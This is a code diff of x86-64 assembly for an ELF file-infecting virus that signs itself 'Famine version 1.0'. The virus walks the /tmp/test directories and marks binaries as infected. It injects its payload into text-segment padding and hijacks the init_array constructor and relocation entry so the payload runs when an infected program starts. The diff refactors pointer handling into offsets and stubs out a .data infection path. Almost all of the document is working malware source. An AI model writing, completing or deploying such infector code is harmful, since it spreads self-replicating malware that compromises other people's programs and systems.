@@ -42,7 +42,7 @@ readdir:
     push    rbp
     mov     rbp, rsp
     sub     rsp, 0x20
-    mov     rax, SYS_CHDIR
+    mov     eax, SYS_CHDIR
     syscall
     mov     rsi, O_DIRECTORY | O_RDONLY
     xor     eax, eax
@@ -59,7 +59,7 @@ readdir:
     mov     eax, SYS_MMAP
     syscall
     test    eax, eax
-    jns      end_readdir
+    jns     end_readdir
     mov     [rsp + 0x8], rax
 
 loop_dir:
@@ -95,16 +95,6 @@ end_readdir:
     leave
     ret
 
-; [rsp]         fd
-; [rsp + 4]     filename
-; [rsp + 0xc]   file_size
-; [rsp + 0x14]  e_hdr
-; [rsp + 0x58]  map
-; [rsp + 0x60]  text_phdr
-; [rsp + 0x68]  data_phdr
-; [rsp + 0x70]  old_entrypoint
-; [rsp + 0x78]  old_text_size
-; [rsp + 0x80]  base_payload_address
 infect:
     push    rbp
     mov     rbp, rsp
@@ -166,35 +156,30 @@ right_type_check:
     je      close_quit_infect
     mov     [rsp + map], rax
 
-    mov     rax, [rsp + map]
     mov     [rax + e_ident + EI_PAD], DWORD INFECTION_MAGIC ; mark binary for infection
-    mov     rdx, QWORD [rax + e_entry]
-    mov     [rsp + old_entrypoint], rdx
 
-    mov     rax, [rsp + map]
     mov     r8, rax
     add     r8, [rax + e_phoff]
-    mov     r9w, [rax + e_phnum]
-    xor     r10, r10 ; index
+    movzx   rcx, WORD [rax + e_phnum]
 loop_phdrs:
+    mov     r9, r8
+    sub     r9, [rsp + map]
     cmp     [r8 + p_type], DWORD PT_LOAD
     jne     next_phdr
     cmp     [r8 + p_flags], DWORD PF_R | PF_X
     jne     comp_data
 save_text_infos:
-    mov     [rsp + text_phdr], r8
+    mov     [rsp + text_phdr_off], r9
     mov     rdx, QWORD [r8 + p_filesz]
     mov     [rsp + old_text_size], rdx
 comp_data:
     cmp     [r8 + p_flags], DWORD PF_R | PF_W
     jne     next_phdr
 save_data_infos:
-    mov     [rsp + data_phdr], r8
+    mov     [rsp + data_phdr_off], r9
 next_phdr:
-    inc     r10
     add     r8w, [rax + e_phentsize]
-    cmp     r10, r9
-    jl      loop_phdrs
+    loop    loop_phdrs
 
 loop_sections:  ; We loop from the end of the section table to get 
                 ; the init_array content before reaching the rela.dyn section
@@ -204,7 +189,8 @@ loop_sections:  ; We loop from the end of the section table to get
     mul     rcx
     add     rax, [rbx + e_shoff]
     add     rax, rbx
-    mov     rdx, [rsp + text_phdr]
+    mov     rdx, [rsp + text_phdr_off]
+    add     rdx, [rsp + map]
     mov     rdx, [rdx + p_offset]
     add     rdx, QWORD [rsp + old_text_size]
     mov     cx, WORD [rbx + e_shnum]
@@ -215,16 +201,19 @@ test_last_text:
     add     r9, QWORD [rax + sh_size]
     cmp     r9, rdx
     jne     test_init_array
-    mov     QWORD [rsp + last_text_shdr], rax
+    mov     QWORD [rsp + last_text_shdr_off], rax
+    sub     QWORD [rsp + last_text_shdr_off], rbx
 test_init_array:
     mov     r9d, [rax + sh_type]
     cmp     r9d, SHT_INIT_ARRAY
     jne     test_bss
-    mov     QWORD [rsp + init_array_shdr], rax
+    mov     QWORD [rsp + init_array_shdr_off], rax
+    sub     QWORD [rsp + init_array_shdr_off], rbx
 test_bss:
     cmp     r9d, SHT_NOBITS
     jne     test_rela
-    mov     QWORD [rsp + bss_shdr], rax
+    mov     QWORD [rsp + bss_shdr_off], rax
+    sub     QWORD [rsp + bss_shdr_off], rbx
 test_rela:
     cmp     r9d, SHT_RELA
     je      get_init_rela
@@ -234,7 +223,8 @@ next_section:
 
 get_init_rela:
     mov     r8, [rsp + map]
-    mov     r10, [rsp + init_array_shdr]
+    mov     r10, [rsp + init_array_shdr_off]
+    add     r10, r8
     add     r8, [r10 + sh_offset]
     mov     r8, [r8]
     mov     QWORD [rsp + old_init_func], r8
@@ -251,12 +241,15 @@ loop_rela:
     jl      loop_rela
     jmp     next_section
 found_init_rela:
-    mov     [rsp + init_rela_entry], r11
+    mov     QWORD [rsp + init_rela_entry_off], r11
+    sub     QWORD [rsp + init_rela_entry_off], rbx
     jmp     next_section
 
 check_text_padding:
-    mov     r8, [rsp + text_phdr]
-    mov     r9, [rsp + data_phdr]
+    mov     r8, [rsp + map]
+    mov     r9, r8
+    add     r8, [rsp + text_phdr_off]
+    add     r9, [rsp + data_phdr_off]
     mov     rbx, [r8 + p_offset]
     add     rbx, [r8 + p_filesz]
     mov     rax, [r9 + p_offset]
@@ -265,14 +258,14 @@ check_text_padding:
     cmp     rax, virus_len
     jle     remap_and_infect_data
 
-    mov     rax, [rsp + text_phdr]
+    mov     rax, r8
     mov     rdi, [rax + p_offset]
     add     rdi, [rax + p_filesz]
-    add     rdi, [rsp + map]
     mov     rsi, [rax + p_vaddr]
     add     rsi, [rax + p_memsz]
     mov     [rsp + payload_base_address], rsi
     mov     [rsp + payload_base_offset], rdi
+    add     rdi, [rsp + map]
     lea     rsi, [rel _start]
     mov     rcx, virus_lenq
 copy_payload:
@@ -280,28 +273,47 @@ copy_payload:
     stosq
     loop    copy_payload
 increase_text_size:
-    mov     rax, [rsp + text_phdr]
+    mov     rax, [rsp + text_phdr_off]
+    add     rax, [rsp + map]
     add     QWORD [rax + p_filesz], virus_len
     add     QWORD [rax + p_memsz], virus_len
-    mov     rax, [rsp + last_text_shdr]
+    add     rax, [rsp + last_text_shdr_off]
     add     QWORD [rax + sh_size], virus_len
     jmp     hijack_constructor
 
 remap_and_infect_data:
+    ; cmp     rax, payload_mprotect_len
+    ; jle     munmap_quit_infect
+    ; mov     rdi, [rsp + map]
+    ; mov     rsi, [rsp + file_size]
+    ; mov     rdx, rsi
+    ; mov     rax, rdi
+    ; add     rax, [rsp + bss_shdr_off]
+    ; add     rdx, [rax + sh_size]
+    ; add     rdx, virus_len
+    ; xor     r10, r10
+    ; mov     eax, SYS_MREMAP
+    ; syscall
+    ; cmp     rax, [rsp + map]
+    ; jne     munmap_quit_infect
     mov     edi, 1
     lea     rsi, [rel data_tmp_text]
     mov     rdx, data_tmp_text.len
     mov     eax, SYS_WRITE
     syscall
-
+    jmp     munmap_quit_infect
 hijack_constructor:
     mov     rax, [rsp + map]
-    mov     rbx, [rsp + init_array_shdr]
+    mov     rbx, [rsp + init_array_shdr_off]
+    add     rbx, rax
     add     rax, [rbx + sh_offset]
     mov     rdx, [rsp + payload_base_address]
     mov     [rax], rdx
+    mov     r11, [rsp + map]
+    add     r11, [rsp + init_rela_entry_off]
     mov     [r11 + r_addend], rdx
     mov     rax, [rsp + payload_base_offset]
+    add     rax, [rsp + map]
     add     rax, virus_len - 4 ; let's override init_ptr with the old_init_ptr
     mov     rdx, [rsp + old_init_func]
     mov     rbx, rax
@@ -329,12 +341,15 @@ quit_infect:
     leave
     ret
 
+payload_mprotect:
+    payload_mprotect_len: equ $ - payload_mprotect
     dir1: db "/tmp/test/", 0
     dir2: db "/tmp/test2/", 0
     cwd: db ".", 0
     signature: db "Famine version 1.0 (c)oded by alagroy-", 0
     data_tmp_text: db "Remapping and infecting .data", 10
         .len: equ $ - data_tmp_text
+    ; TIMES 0x4000 db 0
     final_jump: db 0xe9, 0, 0, 0, 0
 _end:
     xor     rdi, rdi
